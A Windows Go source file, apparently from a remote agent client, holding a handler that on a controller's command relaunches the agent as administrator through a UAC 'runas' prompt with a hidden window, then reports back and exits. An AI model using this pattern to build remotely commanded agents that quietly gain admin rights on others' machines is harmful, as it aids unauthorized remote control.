//go:build windows

package handlers

import (
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/mutex"
	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var (
	modShell32       = windows.NewLazySystemDLL("shell32.dll")
	procShellExecute = modShell32.NewProc("ShellExecuteExW")
)

const (
	_SEE_MASK_NOCLOSEPROCESS = 0x00000040
	_SEE_MASK_NOASYNC        = 0x00000100
	_SW_SHOWNORMAL           = 1
	_SW_HIDE                 = 0
)

type shellExecuteInfo struct {
	cbSize       uint32
	fMask        uint32
	hwnd         uintptr
	lpVerb       *uint16
	lpFile       *uint16
	lpParameters *uint16
	lpDirectory  *uint16
	nShow        int32
	hInstApp     uintptr
	lpIDList     uintptr
	lpClass      *uint16
	hkeyClass    uintptr
	dwHotKey     uint32
	hIcon        uintptr
	hProcess     uintptr
}

func HandleElevate(ctx context.Context, env *agentRuntime.Env, cmdID string, password string) error {
	token := windows.GetCurrentProcessToken()
	if token.IsElevated() {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        true,
			Message:   "already running as admin",
		})
	}

	exePath, err := os.Executable()
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   fmt.Sprintf("failed to resolve executable path: %v", err),
		})
	}

	args := strings.Join(os.Args[1:], " ")

	verb, _ := windows.UTF16PtrFromString("runas")
	file, _ := windows.UTF16PtrFromString(exePath)
	params, _ := windows.UTF16PtrFromString(args)

	sei := shellExecuteInfo{
		fMask:        _SEE_MASK_NOCLOSEPROCESS | _SEE_MASK_NOASYNC,
		lpVerb:       verb,
		lpFile:       file,
		lpParameters: params,
		nShow:        _SW_HIDE,
	}
	sei.cbSize = uint32(unsafe.Sizeof(sei))

	r1, _, err := procShellExecute.Call(uintptr(unsafe.Pointer(&sei)))
	if r1 == 0 {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   fmt.Sprintf("UAC elevation failed: %v", err),
		})
	}

	mutex.ReleaseGlobal()
	log.Printf("[elevate] started elevated process via UAC")

	_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   "elevating — new process started as admin via UAC",
	})

	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
	return nil
}
